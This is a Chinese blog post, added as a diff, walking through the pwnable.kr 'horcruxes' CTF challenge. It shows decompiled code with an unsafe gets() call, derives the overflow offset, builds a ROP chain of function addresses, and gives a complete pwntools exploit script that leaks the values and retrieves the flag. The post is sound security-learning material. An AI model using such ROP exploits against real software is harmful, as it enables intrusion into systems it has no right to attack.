@@ -1,0 +1,239 @@
+---
+layout:     post
+title:      ROP漏洞利用CTF实例
+subtitle:   Return-Oriented Programming 漏洞CTF利用实例
+date:       2019-01-30
+author:     Weizhou
+header-img: img/p5_bg.jpg
+catalog: true
+tags:
+    - Binary
+---
+
+## 前言
+题目来自于`pwnable.kr`平台的`horcruxes`题目。
+
+ROP全程是Return-oriented Programming，该漏洞是利用buffer overflow实现的攻击。
+但是于传统的buffer overflow不同之处在于ROP攻击可以绕过NX保护机制。NX保护机制是
+通过设置栈所处的内存为不可执行区域从而实现的shellcode不可在栈中被执行。
+
+然而ROP是通过覆盖正常程序函数的`return`指针从而指向程序本身的机器代码（gadget），
+然后配合跳转到的`return`指针实现的一系列的连续跳转的程序执行。
+
+本文通过一道CTF题目介绍了作者的解题思路和ROP漏洞的利用过程。
+
+## 正文
+
+### 分析程序
+该程序并没有提供源代码，可以通过IDA或者GDB直观看到程序的运行逻辑：
+
+```cpp
+int ropme()
+{
+  char s[100]; // [esp+4h] [ebp-74h]
+  int v2; // [esp+68h] [ebp-10h]
+  int fd; // [esp+6Ch] [ebp-Ch]
+
+  printf("Select Menu:");
+  __isoc99_scanf("%d", &v2);
+  getchar();
+  if ( v2 == a )
+  {
+    A();
+  }
+  else if ( v2 == b )
+  {
+    B();
+  }
+  else if ( v2 == c )
+  {
+    C();
+  }
+  else if ( v2 == d )
+  {
+    D();
+  }
+  else if ( v2 == e )
+  {
+    E();
+  }
+  else if ( v2 == f )
+  {
+    F();
+  }
+  else if ( v2 == g )
+  {
+    G();
+  }
+  else
+  {
+    printf("How many EXP did you earned? : ");
+    gets(s);
+    if ( atoi(s) == sum )
+    {
+      fd = open("flag", 0);
+      s[read(fd, s, 0x64u)] = 0;
+      puts(s);
+      close(fd);
+      exit(0);
+    }
+    puts("You'd better get more experience to kill Voldemort");
+  }
+  return 0;
+}
+```
+
+可以明显发现可以被利用的漏洞代码`gets()`，该函数没有指定buffer的大小，并从`stdin`
+缓冲区读取数据，所以会导致栈中的return指针被覆盖。
+
+首先检查一下程序开启了什么保护：
+
+[![p1.png](https://i.postimg.cc/R0nVtJx4/p1.png)](https://postimg.cc/mcBsfDr5)
+
+发现程序没有开启PIE也就是ASLR随机地址载入的保护机制。为buffer overflow 提供了很大的便捷
+同样没有发现Canary对栈指针进行保护。但是可以明显发现该程序实现了NX栈不可执行的保护。
+
+之后要看一下buffer的开始地址到覆盖`ropme()`函数return地址的距离，并进行payload的设计
+
+在IDA pro反汇编出的伪代码中已经标记出了`s`buffer的大小和起始地址：`[ebp - 0x74]`
+基于此我们可以推断出buffer的起始地址到`ropme()`反回地址的距离应该为`0x74 + 4`。
+多出的这4个bytes长度是存放stack frame（原函数ebp地址）的数据长度。所以可以初步判断
+`padding`的大小为`0x78 = 120`个bytes数据。
+
+通过查看源码可以发现，其实只要通过下述这个判断flag就可以得到flag：
+```cpp
+if ( atoi(s) == sum )
+{
+  fd = open("flag", 0);
+  s[read(fd, s, 0x64u)] = 0;
+  puts(s);
+  close(fd);
+  exit(0);
+}
+```
+通过这个判断我有了两个思路，第一个思路是真正的达到判定条件，得到flag，
+第二个思路是，在覆盖return指针后是否可以直接使得程序跳回到判断之后的语句。
+
+第二种想法最简单，所以先尝试了这种想法。但是通过数次努力，发现`ropme()`函数中的地址
+是不可以被反回的。函数中的任意一个地址都不可以。
+
+所以只能实行第二个思路，也是这个题目想让我们实现的方法。仔细看一下这个判断，首先通过
+`atoi()`函数将我们输入的到`s`的buffer里的字符串转换为`int`数据。
+然后再与`sum`数值进行比较，接下来就要知道`sum`是如何计算出来的。
+在IDA pro中很容易就会发现`sum`生成的地方：
+
+```cpp
+unsigned int init_ABCDEFG()
+{
+  int v0; // eax
+  unsigned int result; // eax
+  unsigned int buf; // [esp+8h] [ebp-10h]
+  int fd; // [esp+Ch] [ebp-Ch]
+
+  fd = open("/dev/urandom", 0);
+  if ( read(fd, &buf, 4u) != 4 )
+  {
+    puts("/dev/urandom error");
+    exit(0);
+  }
+  close(fd);
+  srand(buf);
+  a = -559038737 * rand() % 0xCAFEBABE;
+  b = -559038737 * rand() % 0xCAFEBABE;
+  c = -559038737 * rand() % 0xCAFEBABE;
+  d = -559038737 * rand() % 0xCAFEBABE;
+  e = -559038737 * rand() % 0xCAFEBABE;
+  f = -559038737 * rand() % 0xCAFEBABE;
+  g = -559038737 * rand() % 0xCAFEBABE;
+  result = f + e + d + c + b + a + g;
+  sum = result;
+  return result;
+}
+```
+
+`sum = a + b + c + d + e + f + g`，而这七个数值是随机生成的。此时会意识到在`ropme()`
+函数中有命名为`A B C D E F G`的函数，查看各个函数：
+```cpp
+int A()
+{
+  return printf("You found \"Tom Riddle's Diary\" (EXP +%d)\n", a);
+}
+```
+七个函数的作用都是与函数`A()`类似，打印出在`init_ABCDEFG()`函数中随机生成的各个数值。
+基于这个特点，我们构造rop payload的思路应该是，逐次返回到各个函数，然后使其打印出随机的数值。
+最后再返回到`ropme()`函数，将得到的数值相加进行输入，即可得到flag。
+
+### 构造payload：
+首先我们知道了padding数据的大小应为`120 bytes`。
+然后在`120 bytes`数据后可以拼接上`A()`函数的其实地址：`0x0809fe4b`。这样在`ropme()`
+函数结束后就能够跳转并执行`A()`函数。得到a的随机数值。
+但是新的问题是，如何能在运行完`A()`函数后执行，`B()`函数。其实仔细观察栈的结构就很容易发现，
+当函数`A()`执行结束之后，会执行return指令，此时return的地址应该是在我们覆盖的`ropme()`
+函数return指针的后4个bytes，也就是`120 bytes + 0x0809fe4b`后buffer中的数据。
+这样一来就很清楚了，直接将地址罗列在padding数据之后，函数会一个一个的进行跳转。
+最后一个问题就是，最后还要返回到ropme函数，但是，这个函数的所有地址都不能被返回。
+所以，可以通过返回到`main`函数中调用`ropme()`函数的地方执行`ropme()`。
+
+下面是找到的各函数和需要的地址：
+```
+call A() --> 0x809fe4b
+call B() --> 0x809fe6a
+call C() --> 0x809fe89
+call D() --> 0x809fea8
+call E() --> 0x809fec7
+call F() --> 0x809fee6
+call G() --> 0x809ff05
+main <call ropme> --> 0x809fffc
+```
+
+所以构造出的`payload`为：
+
+`'A' * 120 + 0x809fe4b + 0x809fe6a + 0x809fe89 + 0x809fea8 + 0x809fec7 +
+0x809fee6 + 0x809ff05 + 0x809fffc`
+
+### 写脚本：
+
+使用pwntools很容易就可以完成攻击脚本：
+```python
+from pwn import *
+context.log_level='debug'
+LOCAL = False
+
+if __name__ == '__main__':
+    if LOCAL:
+        c = process('/home/horcruxes/horcruxes')
+    else:
+        c = remote('0', 9032)
+    msg = c.recvuntil("Menu:")
+    c.sendline('1')
+    msg = c.recv(512)
+    payload = 'A'*0x78
+    payload += p32(0x809fe4b)  # address A（）
+    payload += p32(0x809fe6a)  # address B（）
+    payload += p32(0x809fe89)  # address C（）
+    payload += p32(0x809fea8)  # address D（）
+    payload += p32(0x809fec7)  # address E（）
+    payload += p32(0x809fee6)  # address F（）
+    payload += p32(0x809ff05)  # address G（）
+    payload += p32(0x809fffc)  # address main<call ropme>
+    c.sendline(payload)
+    sum = 0
+    c.recvline()
+    for i in range(7):
+        s = c.recvline()
+        n = int(s.strip('\n').split('+')[1][:-1])
+        sum += n
+    print "Result: " + str(sum)
+    c.recvuntil("Menu:")
+    c.sendline("1")
+    c.recvuntil(" : ")
+    c.sendline(str(sum))
+    log.success("Flag: " + c.recvline())
+```
+作者是ssh到服务器上在`/tmp`文件加下建立并运行文件的，需要多跑几次，good luck！
+
+[![p2.png](https://i.postimg.cc/v891xjLC/p2.png)](https://postimg.cc/Lh94rxWV)
+
+## 结语
+这只是想通过这一到题目搞清楚ROP的原理和利用的方式，对像我这种的初学者有一定的启发和
+学习的作用。
